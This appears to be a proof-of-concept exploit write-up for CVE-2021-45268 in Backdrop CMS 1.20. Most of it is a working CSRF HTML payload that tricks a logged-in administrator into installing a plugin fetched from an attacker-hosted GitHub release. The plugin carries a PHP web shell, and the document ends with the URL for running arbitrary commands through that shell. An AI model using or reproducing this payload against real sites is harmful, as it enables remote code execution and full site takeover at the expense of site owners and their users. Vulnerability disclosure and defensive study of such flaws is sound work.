# CSRF to RCE on Backdrop CMS 1.20

This PoC describe how to exploit CSRF on Backdrop CMS Version 1.20 with escalation to RCE.

## ## CVE ID

[CVE-2021-45268](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45268)

## Description

The Backdrop CMS version 1.20 allows plugins to be added via ZIP files uploaded to the site. And because it does not have anti-CSRF protection, it is possible for an attacker to create a plugin with a file that allows execution of commands, host it and, using a forged page, make the site admin upload this plugin just by clicking on a malicious link.

## Attack Scenario

We use a default plugin, available on the project page on GitHub, we insert a file called shell.php, which contains a PHP snippet that allows remote execution of commands, and we provide this plugin forged in another github (https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS/releases/tag/backdrop).

We create an HTML page with a payload that forces the site to install the plugin when called via the browser. In this way, when accessed by the site's admin, the shell.php file will be available for use by the attacker.

## Payload

```
<html>
<body>
        <form method="POST" action="http://example.com/backdrop/?q=system/ajax">
                <input type="text" name="q" value="system/ajax">
                <input type="text" name="Backdrop.tableDrag.showWeight" value="0">
                <input type="text" name="SESSaca5a63f4c2fc739381fab7741d68783" value="4IVp_-QA9bzSPmMyXalKTNS3BNFTQnxJTw8t93Gi6c8">
                <input type="text" name="bulk" value="">
                <input type="text" name="project_url" value="https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS/releases/download/backdrop/reference.tar">
                <input type="text" name="files[project_upload]" value="">
                <input type="text" name="form_build_id" value="form-p-BrvXTDPqUhhAatHFr4d_dQKt6Dn5d-mIf4hwFyuJA">
                <input type="text" name="form_token" value="aYigpmZz3OXNHnjJTO2Tu43IXMKyrMXvB2yL-4NFbTw">
                <input type="text" name="form_id" value="installer_manager_install_form">
                <input type="text" name="_triggering_element_name" value="op">
                <input type="text" name="_triggering_element_value" value="Install">
                <input type="text" name="ajax_html_ids[]" value="skip-link">
                <input type="text" name="ajax_html_ids[]" value="main-content">
                <input type="text" name="ajax_html_ids[]" value="installer-browser-filters-form">
                <input type="text" name="ajax_html_ids[]" value="edit-search-text">
                <input type="text" name="ajax_html_ids[]" value="edit-submit">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-link">
                <input type="text" name="ajax_html_ids[]" value="add-to-queue-link-bootstrap_lite">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-link">
                <input type="text" name="ajax_html_ids[]" value="add-to-queue-link-corporate_kiss">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-link">
                <input type="text" name="ajax_html_ids[]" value="add-to-queue-link-lateral">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-link">
                <input type="text" name="ajax_html_ids[]" value="add-to-queue-link-colihaut">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-link">
                <input type="text" name="ajax_html_ids[]" value="add-to-queue-link-shasetsu">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-link">
                <input type="text" name="ajax_html_ids[]" value="add-to-queue-link-borg">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-link">
                <input type="text" name="ajax_html_ids[]" value="add-to-queue-link-pelerine">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-link">
                <input type="text" name="ajax_html_ids[]" value="add-to-queue-link-cleanish">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-link">
                <input type="text" name="ajax_html_ids[]" value="add-to-queue-link-materialize">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-link">
                <input type="text" name="ajax_html_ids[]" value="add-to-queue-link-lumi">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-link">
                <input type="text" name="ajax_html_ids[]" value="add-to-queue-link-tatsu">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-link">
                <input type="text" name="ajax_html_ids[]" value="add-to-queue-link-mero">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-link">
                <input type="text" name="ajax_html_ids[]" value="add-to-queue-link-snazzy">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-link">
                <input type="text" name="ajax_html_ids[]" value="add-to-queue-link-afterlight_tribute">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-link">
                <input type="text" name="ajax_html_ids[]" value="add-to-queue-link-minicss">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-link">
                <input type="text" name="ajax_html_ids[]" value="add-to-queue-link-zurb_foundation_6">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-link">
                <input type="text" name="ajax_html_ids[]" value="add-to-queue-link-thesis">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-link">
                <input type="text" name="ajax_html_ids[]" value="add-to-queue-link-summer_fun">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-link">
                <input type="text" name="ajax_html_ids[]" value="add-to-queue-link-news_arrow">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-ajax">
                <input type="text" name="ajax_html_ids[]" value="title-link">
                <input type="text" name="ajax_html_ids[]" value="add-to-queue-link-basis_contrib">
                <input type="text" name="ajax_html_ids[]" value="installer-browser-manual-install-link">
                <input type="text" name="ajax_html_ids[]" value="edit-link">
                <input type="text" name="ajax_html_ids[]" value="admin-bar">
                <input type="text" name="ajax_html_ids[]" value="admin-bar-wrapper">
                <input type="text" name="ajax_html_ids[]" value="admin-bar-icon">
                <input type="text" name="ajax_html_ids[]" value="admin-bar-menu">
                <input type="text" name="ajax_html_ids[]" value="admin-bar-extra">
                <input type="text" name="ajax_html_ids[]" value="admin-bar-search-items">
                <input type="text" name="ajax_html_ids[]" value="ui-id-1">
                <input type="text" name="ajax_html_ids[]" value="backdrop-modal">
                <input type="text" name="ajax_html_ids[]" value="installer-manager-install-form">
                <input type="text" name="ajax_html_ids[]" value="edit-bulk-wrapper">
                <input type="text" name="ajax_html_ids[]" value="edit-bulk">
                <input type="text" name="ajax_html_ids[]" value="edit-project-url-wrapper">
                <input type="text" name="ajax_html_ids[]" value="edit-project-url">
                <input type="text" name="ajax_html_ids[]" value="edit-project-upload-wrapper">
                <input type="text" name="ajax_html_ids[]" value="edit-project-upload">
                <input type="text" name="ajax_html_ids[]" value="edit-actions">
                <input type="text" name="ajax_html_ids[]" value="edit-submit--2">
                <input type="text" name="ajax_page_state[theme]" value="seven">
                <input type="text" name="ajax_page_state[theme_token]" value="RY9h420qjWmejTKFp7C0ytS__FtpWnVmEjVCnHWFblo">
                <input type="text" name="ajax_page_state[css][core/misc/normalize.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/modules/system/css/system.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/modules/system/css/system.theme.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/modules/system/css/messages.theme.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/modules/system/css/system.admin.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/modules/layout/css/grid-flexbox.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/modules/contextual/css/contextual.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/modules/comment/css/comment.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/modules/date/css/date.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/modules/field/css/field.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/modules/search/search.theme.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/modules/user/css/user.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/modules/views/css/views.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/modules/admin_bar/css/admin_bar.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/modules/admin_bar/css/admin_bar-print.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/layouts/boxton/boxton.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/modules/installer/css/installer.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/themes/seven/css/seven.base.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/themes/seven/css/style.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/themes/seven/css/responsive-tabs.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/misc/opensans/opensans.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/misc/ui/jquery.ui.core.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/misc/ui/jquery.ui.button.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/misc/ui/jquery.ui.draggable.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/misc/ui/jquery.ui.resizable.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/misc/ui/jquery.ui.dialog.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/misc/dialog.theme.css]" value="1">
                <input type="text" name="ajax_page_state[css][core/misc/ui/jquery.ui.theme.css]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/html5.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/jquery.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/jquery-extend-3.4.0.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/jquery-html-prefilter-3.5.0.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/jquery.once.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/backdrop.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/modules/layout/js/grid-fallback.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/ajax.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/jquery.form.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/modules/contextual/js/contextual.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/form.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/modules/admin_bar/js/admin_bar.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/modules/installer/js/installer.project_list.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/progress.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/tableheader.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/dismiss.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/themes/seven/js/script.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/ui/jquery.ui.data.min.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/ui/jquery.ui.disable-selection.min.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/ui/jquery.ui.form.min.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/ui/jquery.ui.labels.min.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/ui/jquery.ui.scroll-parent.min.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/ui/jquery.ui.tabbable.min.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/ui/jquery.ui.unique-id.min.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/ui/jquery.ui.version.min.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/ui/jquery.ui.escape-selector.min.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/ui/jquery.ui.focusable.min.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/ui/jquery.ui.form-reset-mixin.min.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/ui/jquery.ui.ie.min.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/ui/jquery.ui.keycode.min.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/ui/jquery.ui.plugin.min.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/ui/jquery.ui.safe-active-element.min.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/ui/jquery.ui.safe-blur.min.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/ui/jquery.ui.widget.min.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/textarea.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/ui/jquery.ui.button.min.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/ui/jquery.ui.mouse.min.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/jquery.ui.touch-punch.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/ui/jquery.ui.draggable.min.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/ui/jquery.ui.position.min.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/ui/jquery.ui.resizable.min.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/ui/jquery.ui.dialog.min.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/dialog.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/dialog.ajax.js]" value="1">
                <input type="text" name="ajax_page_state[js][core/misc/collapse.js]" value="1">
                <input type="submit" value="Send">
        </form>
</body>
</html> 
```

Run on your browser: http://example.com/backdrop/modules/reference/shell.php?cmd=[command] to execute remote commands.
